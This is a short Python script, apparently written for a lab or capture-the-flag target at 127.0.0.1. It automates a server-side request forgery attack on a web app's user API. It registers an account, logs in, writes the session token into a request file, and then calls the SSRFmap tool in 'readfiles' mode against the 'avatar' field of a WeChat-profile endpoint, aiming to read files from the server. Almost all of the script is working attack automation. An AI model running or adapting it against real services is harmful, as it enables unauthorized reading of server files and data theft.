import requests
import json
import os

class auto:
    def __init__(self):
        self.baseurl = "http://127.0.0.1:80"
        self.phone = "13791128359"
        self.password = "a1@123"
    
    def register(self):
        url = self.baseurl + '/api/account/register' 
        user = {
            "mobile": self.phone,
            "password": self.password,
            "client": 6
        }
        r = requests.post(url, json=user, verify=False)
        response = json.loads(r.text)
        if response["code"] == 1:
            return True
        else:
            return False


    def login(self):
        url =  self.baseurl + '/api/account/login' 

        user = {
            "account": self.phone,
            "password": self.password,
            "client": 6
        }
        r = requests.post(url, json=user, verify=False)
        response = json.loads(r.text)
        if response["code"] == 1:
            token = response['data']['token']
            return token
        return None

    def updateWechat(self, token, avatar):
        url = self.baseurl + '/api/user/setWechatInfo'
        
        user = {
            "nickname":"nickname",
            "avatar": avatar,
            "sex": 1
        }
        r = requests.post(url, headers={"token": token}, json=user, verify=False)
        response = json.loads(r.text)
        if response["code"] == 1:
            return True
        return False

def change_token(filename, token):
    # Mở file và đọc nội dung
    with open(filename, 'r') as file:
        lines = file.readlines()

    # Thay thế dòng có chứa token
    with open(filename, 'w') as file:
        for line in lines:
            if line.startswith('token:'):
                # Thay thế nội dung của dòng token
                file.write(f'token: {token}\n')
            else:
                file.write(line)


def main():
    a = auto()
    a.register()
    token = a.login()
    change_token('test.txt', token)
    os.system(f"python3 ssrfmap.py -r test.txt -p avatar -m readfiles --token {token}")

if __name__ == '__main__':
    main()
